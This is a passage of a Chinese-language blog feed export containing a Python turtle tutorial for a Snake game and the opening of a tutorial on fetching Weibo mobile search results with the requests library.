id="如何让蛇运动以及吃苹果"><a href="#如何让蛇运动以及吃苹果" class="headerlink" title="如何让蛇运动以及吃苹果"></a>如何让蛇运动以及吃苹果</h3><p>蛇是由六个矩形组成，它们的坐标在一个列表snake里面。通过<code>pop()</code>删除snake[0]，然后通过<code>append()</code>加入新的坐标snake[5]使得蛇运动起来。吃苹果，判断苹果的坐标是否与蛇的坐标相同，如果相同则不需删除snake[0]。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#设置蛇一开始走的方向</span></span><br><span class="line">snake_x = <span class="number">10</span></span><br><span class="line">snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:<span class="comment">#判断苹果坐标与蛇头坐标是否相等</span></span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">    turtle.clear()<span class="comment">#清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    gameloop_apple()<span class="comment">#画出苹果</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">200</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="设置蛇的转向"><a href="#设置蛇的转向" class="headerlink" title="设置蛇的转向"></a>设置蛇的转向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y</span><br><span class="line">    snake_x = x</span><br><span class="line">    snake_y = y</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    </span><br><span class="line">    turtle.listen()  <span class="comment"># 监听，是否按下键盘</span></span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">10</span>), <span class="string">"w"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">-10</span>), <span class="string">"s"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">-10</span>, <span class="number">0</span>), <span class="string">"a"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">10</span>, <span class="number">0</span>), <span class="string">"d"</span>)</span><br><span class="line">    </span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="判断蛇是否撞到墙和撞到自己"><a href="#判断蛇是否撞到墙和撞到自己" class="headerlink" title="判断蛇是否撞到墙和撞到自己"></a>判断蛇是否撞到墙和撞到自己</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断蛇是否撞墙</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">-210</span>&lt;=snake[<span class="number">-1</span>][<span class="number">0</span>]&lt;=<span class="number">190</span> <span class="keyword">and</span> <span class="number">-200</span>&lt;=snake[<span class="number">-1</span>][<span class="number">1</span>]&lt;=<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#判断蛇是否撞到自己</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>] == snake[n][<span class="number">0</span>] <span class="keyword">and</span> snake[<span class="number">-1</span>][<span class="number">1</span>] == snake[n][<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断蛇是否撞到墙和撞到自己</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> collision()) <span class="keyword">or</span> collision_snake():</span><br><span class="line">        square(snake[<span class="number">-2</span>][<span class="number">0</span>], snake[<span class="number">-2</span>][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">        turtle.update()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:</span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">    turtle.clear()<span class="comment"># 清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">150</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#设置蛇一开始走的方向</span></span><br><span class="line">snake_x = <span class="number">10</span></span><br><span class="line">snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#画布大小为420*420，因此x轴在(-210,210)，去除边框大小x轴为(200,20)</span></span><br><span class="line">apple_x = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line">apple_y = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断蛇是否撞墙</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">-210</span>&lt;=snake[<span class="number">-1</span>][<span class="number">0</span>]&lt;=<span class="number">190</span> <span class="keyword">and</span> <span class="number">-200</span>&lt;=snake[<span class="number">-1</span>][<span class="number">1</span>]&lt;=<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#判断蛇是否撞到自己</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>] == snake[n][<span class="number">0</span>] <span class="keyword">and</span> snake[<span class="number">-1</span>][<span class="number">1</span>] == snake[n][<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y</span><br><span class="line">    snake_x = x</span><br><span class="line">    snake_y = y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y,snake</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> collision()) <span class="keyword">or</span> collision_snake():</span><br><span class="line">        square(snake[<span class="number">-2</span>][<span class="number">0</span>], snake[<span class="number">-2</span>][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">        turtle.update()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 蛇的变量</span></span><br><span class="line">        snake = [[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">10</span>, <span class="number">0</span>], [<span class="number">20</span>, <span class="number">0</span>], [<span class="number">30</span>, <span class="number">0</span>], [<span class="number">40</span>, <span class="number">0</span>], [<span class="number">50</span>, <span class="number">0</span>]]</span><br><span class="line">        <span class="comment"># 苹果的变量</span></span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        <span class="comment"># 蛇的方向坐标</span></span><br><span class="line">        snake_x = <span class="number">10</span></span><br><span class="line">        snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:</span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">    turtle.clear()<span class="comment"># 清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">150</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    turtle.listen()  <span class="comment"># 监听，是否按下键盘</span></span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">10</span>), <span class="string">"w"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">-10</span>), <span class="string">"s"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">-10</span>, <span class="number">0</span>), <span class="string">"a"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">10</span>, <span class="number">0</span>), <span class="string">"d"</span>)</span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/13.jpg"  alt="13"></p>]]></content>
      
      
      <categories>
          
          <category> python游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微博搜索爬虫</title>
      <link href="/2020/04/28/%E5%BE%AE%E5%8D%9A%E6%90%9C%E7%B4%A2%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/04/28/%E5%BE%AE%E5%8D%9A%E6%90%9C%E7%B4%A2%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="微博搜索爬虫"><a href="#微博搜索爬虫" class="headerlink" title="微博搜索爬虫"></a>微博搜索爬虫</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>由于网页端反爬虫机制比较完善所以才去移动端进行爬虫。</p><p>url地址：<a href="https://m.weibo.cn/" target="_blank" rel="noopener">https://m.weibo.cn/</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1.jpg"  alt="1"></p><p>搜索框，输入关键词进行搜索</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/2.jpg"  alt="2"></p><p>对网页进行抓包，找到相关数据</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/3.jpg"  alt="3"></p><p>查看数据是否与网页的内容相同</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/4.png"  alt="4"></p><p>分析多组数据的请求头</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/5.jpg"  alt="5"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/6.jpg"  alt="6"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/7.jpg"  alt="7"></p><h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><h3 id="构造url地址"><a href="#构造url地址" class="headerlink" title="构造url地址"></a>构造url地址</h3><p>通过网页分析构造url地址对，地址信息访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造搜索内容</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'containerid'</span>:<span class="string">'100103type=1&amp;q=电影'</span>,</span><br><span class="line"><span class="string">'page_type'</span>:<span class="string">'searchall'</span>,</span><br><span class="line"><span class="string">'page'</span>:<span class="string">'1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#反爬虫，模拟游览器访问</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'</span>,&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://m.weibo.cn/api/container/getIndex?"</span></span><br><span class="line"><span class="comment">#通过GET方式访问该网站</span></span><br><span class="line">html = requests.get(url,headers=headers,params=data)</span><br><span class="line"><span class="comment">#打印结果，如果返回200,则访问成功</span></span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/8.png"  alt="8"></p><h3 id="获取相关数据"><a href="#获取相关数据" class="headerlink" title="获取相关数据"></a>获取相关数据</h3><p>通过对网页分析，该网页获取的数据为json格式的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">......</span><br><span class="line"><span class="comment">#对返回结果判断，如果是200，则把数据转为json格式</span></span><br><span class="line"><span class="keyword">if</span> html.content:</span><br><span class="line">    response = html.json()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/9.jpg"  alt="9"></p><p>数据为字典类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">.......</span><br><span class="line"><span class="comment">#提取数据</span></span><br><span class="line">cards = response[<span class="string">"data"</span>][<span class="string">"cards"</span>]</span><br><span class="line">result = []</span><br><span class="line"><span class="comment">#遍历cards列表</span></span><br><span class="line"><span class="keyword">for</span> card <span class="keyword">in</span> cards:</span><br><span class="line">    <span class="comment">#判断"mblog"键是否存在该字典中</span></span><br><span class="line">mblogs = <span class="string">"mblog"</span></span><br><span class="line"><span class="keyword">if</span> mblogs <span class="keyword">in</span> card:</span><br><span class="line">        <span class="comment">#提取正文内容</span></span><br><span class="line">text = card[mblogs][<span class="string">"text"</span>]</span><br><span class="line">        <span 